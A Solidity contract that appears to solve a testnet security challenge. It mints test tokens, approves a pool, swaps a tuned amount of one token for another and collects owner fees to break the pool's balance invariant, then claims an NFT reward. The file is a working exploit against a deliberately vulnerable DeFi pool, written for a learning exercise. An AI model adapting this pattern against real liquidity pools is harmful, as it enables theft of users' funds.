//SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

// this contract constructor arguments: 0xdeB8d8eFeF7049E280Af1d5FE3a380F3BE93B648, 0x31801c3e09708549c1b2c9e1cfbf001399a1b9fa
// challenge 5 contract sepolia: 0xdeB8d8eFeF7049E280Af1d5FE3a380F3BE93B648
// nft contract address for challenges: 0x31801c3e09708549c1b2c9e1cfbf001399a1b9fa
interface IChallenge {
    function solveChallenge(string memory yourTwitterHandle) external;

    function getTokenA() external view returns (address);

    function getTokenB() external view returns (address);

    function getTokenC() external view returns (address);

    function getPool() external view returns (address);
}

interface IERC721 {
    function getTokenCounter() external returns (uint256);

    function balanceOf(address owner) external view returns (uint256 balance);

    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256 tokenId);

    function transferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function mint(address to) external;

    function approve(address spender, uint256 amount) external returns (bool);

    function INITIAL_SUPPLY() external view returns (uint256);
}

interface S5POOL {
    function deposit(uint256 amount, uint64 deadline) external;

    function swapFrom(IERC20 tokenFrom, IERC20 tokenTo, uint256 amount) external;

    function collectOwnerFees(IERC20 token) external;
}

contract Solver is IERC721Receiver {
    address isOwner;
    address ownership = address(this);
    bool public nftReceived = false;

    IERC721 public nftContract;
    IChallenge challengeContract;

    uint256 private constant AMOUNT_TO_SWAP = 30089949916761;

    constructor(address _challengeContract, address _nftContract) {
        isOwner = msg.sender;
        challengeContract = IChallenge(_challengeContract);
        nftContract = IERC721(_nftContract);
    }

    /*//////////////////////////////////////////////////////////////
                             FUNCTIONS
    //////////////////////////////////////////////////////////////*/
    /*//////////////////////////////////////////////////////////////
             MINT TOKENS TO THIS CONTRACT AND APPROVE SPENDING
    //////////////////////////////////////////////////////////////*/
    function mintAllTokens() external {
        uint256 amountToApprove = 1000000000000000000;

        // grab A
        address tokenAAddressA = challengeContract.getTokenA();
        IERC20 tokenA = IERC20(tokenAAddressA);

        // grab B
        address tokenAAddressB = challengeContract.getTokenB();
        IERC20 tokenB = IERC20(tokenAAddressB);

        // grab C
        address tokenAAddressC = challengeContract.getTokenC();
        IERC20 tokenC = IERC20(tokenAAddressC);

        // grab pool
        address s5PoolAddress = challengeContract.getPool();
        S5POOL s5Pool = S5POOL(s5PoolAddress);

        // mint A B C 1000000000000000000 each
        tokenA.mint(address(ownership));
        tokenB.mint(address(ownership));
        tokenC.mint(address(ownership));

        tokenA.approve(address(s5Pool), amountToApprove);
        tokenB.approve(address(s5Pool), amountToApprove);
        tokenC.approve(address(s5Pool), amountToApprove);
    }

    /*//////////////////////////////////////////////////////////////
                             CALLS TO POOL
    //////////////////////////////////////////////////////////////*/

    // Deposit function is not necessary, I put it there for curiosity matters if needed
    // Deposit 1:1
    function depositToPool(uint256 amount) external {
        uint64 deadline = uint64(block.timestamp);
        address s5PoolAddress = challengeContract.getPool();
        S5POOL s5Pool = S5POOL(s5PoolAddress);
        s5Pool.deposit(amount, deadline);
    }

    // Swap an amount of token C to token A
    function swapTokensCToA() external {
        // grab A
        address tokenAAddressA = challengeContract.getTokenA();
        IERC20 tokenA = IERC20(tokenAAddressA);

        // grab C
        address tokenAAddressC = challengeContract.getTokenC();
        IERC20 tokenC = IERC20(tokenAAddressC);

        // grab pool
        address s5PoolAddress = challengeContract.getPool();
        S5POOL s5Pool = S5POOL(s5PoolAddress);
        s5Pool.swapFrom(tokenC, tokenA, AMOUNT_TO_SWAP);
    }

    // collect fees in token A
    function collectOwnerFeesInTokenA() external {
        // grab A
        address tokenAAddressA = challengeContract.getTokenA();
        IERC20 tokenA = IERC20(tokenAAddressA);

        // grab pool
        address s5PoolAddress = challengeContract.getPool();
        S5POOL s5Pool = S5POOL(s5PoolAddress);
        s5Pool.collectOwnerFees(tokenA);
    }

    function solve(string memory twitterHandler) public returns (bool) {
        // challengeContract.solveChallenge(guessSolve, twitterHandler);

        (bool success,) =
            address(challengeContract).call(abi.encodeWithSignature("solveChallenge(string)", twitterHandler));
        return (success);
    }

    function transferNFTToOwner(uint256 tokenId) public {
        require(msg.sender == isOwner, "Only the contract owner can transfer the NFT");

        uint256 balance = nftContract.balanceOf(address(this));
        require(balance > 0, "Contract does not own any NFTs");

        nftContract.transferFrom(address(this), isOwner, tokenId);
    }
    /*//////////////////////////////////////////////////////////////
                             GETTERS FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /*//////////////////////////////////////////////////////////////
                             INVARIANT CHECKER
    //////////////////////////////////////////////////////////////*/
    function checkInvariantBoolean() public view returns (bool) {
        // grab A
        address tokenAAddressA = challengeContract.getTokenA();
        IERC20 tokenA = IERC20(tokenAAddressA);

        // grab B
        address tokenAAddressB = challengeContract.getTokenB();
        IERC20 tokenB = IERC20(tokenAAddressB);

        // grab initial supply total
        uint256 initialSupplyTotal = tokenA.INITIAL_SUPPLY() + tokenB.INITIAL_SUPPLY();

        // grab Pool funds A
        uint256 poolBalanceA = getPoolBalanceOfTokenA();

        // grab pool funds B
        uint256 poolBalanceB = getPoolBalanceOfTokenB();

        if (poolBalanceA + poolBalanceB < initialSupplyTotal) {
            return true;
        } else {
            return false;
        }
    }

    /*//////////////////////////////////////////////////////////////
                            POOL & TOKENS ADDRESSES
    //////////////////////////////////////////////////////////////*/

    function getTokenA() public view returns (address) {
        return challengeContract.getTokenA();
    }

    function getTokenB() public view returns (address) {
        return challengeContract.getTokenB();
    }

    function getTokenC() public view returns (address) {
        return challengeContract.getTokenC();
    }

    function getPool() external view returns (address) {
        return challengeContract.getPool();
    }

    /*//////////////////////////////////////////////////////////////
                             POOL BALANCES
    //////////////////////////////////////////////////////////////*/

    function getPoolBalanceOfTokenA() public view returns (uint256) {
        address tokenAAddressA = challengeContract.getTokenA();
        address s5Pool = challengeContract.getPool();
        IERC20 tokenA = IERC20(tokenAAddressA);
        return tokenA.balanceOf(address(s5Pool));

        // or oneliner
        // return IERC20(challengeContract.getTokenA()).balanceOf(address(challengeContract.getPool()));
    }

    function getPoolBalanceOfTokenB() public view returns (uint256) {
        address tokenAAddressB = challengeContract.getTokenB();
        address s5Pool = challengeContract.getPool();
        IERC20 tokenB = IERC20(tokenAAddressB);
        return tokenB.balanceOf(address(s5Pool));

        // or oneliner
        // return IERC20(challengeContract.getTokenB()).balanceOf(address(challengeContract.getPool()));
    }

    function getPoolBalanceOfTokenC() public view returns (uint256) {
        address tokenAAddressC = challengeContract.getTokenC();
        IERC20(challengeContract.getTokenC()).balanceOf(address(challengeContract.getPool()));
        address s5Pool = challengeContract.getPool();
        IERC20 tokenC = IERC20(tokenAAddressC);
        return tokenC.balanceOf(address(s5Pool));

        // or oneliner
        // return IERC20(challengeContract.getTokenC()).balanceOf(address(challengeContract.getPool()));
    }

    /*//////////////////////////////////////////////////////////////
                             THIS CONTRACT BALANCES
    //////////////////////////////////////////////////////////////*/

    function getThisBalanceOfTokenA() public view returns (uint256) {
        address tokenAAddressA = challengeContract.getTokenA();
        IERC20 tokenA = IERC20(tokenAAddressA);
        return tokenA.balanceOf(address(ownership));

        // or oneliner
        // return IERC20(challengeContract.getTokenA()).balanceOf(address(ownership));
    }

    function getThisBalanceOfTokenB() public view returns (uint256) {
        address tokenAAddressB = challengeContract.getTokenB();
        IERC20 tokenB = IERC20(tokenAAddressB);
        return tokenB.balanceOf(address(ownership));

        // or oneliner
        // return IERC20(challengeContract.getTokenB()).balanceOf(address(ownership));
    }

    function getThisBalanceOfTokenC() public view returns (uint256) {
        address tokenAAddressC = challengeContract.getTokenC();
        IERC20 tokenC = IERC20(tokenAAddressC);
        return tokenC.balanceOf(address(ownership));

        // or oneliner
        // return IERC20(challengeContract.getTokenC()).balanceOf(address(ownership));
    }

    /*//////////////////////////////////////////////////////////////
                        Just in case for testing
    //////////////////////////////////////////////////////////////*/

    function withdrawDepositFromContract() public {
        require(msg.sender == isOwner, "Only the owner withdraw");
        payable(msg.sender).transfer(address(this).balance);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        nftReceived = true;
        return this.onERC721Received.selector;
    }

    fallback() external {}

    receive() external payable {}
}
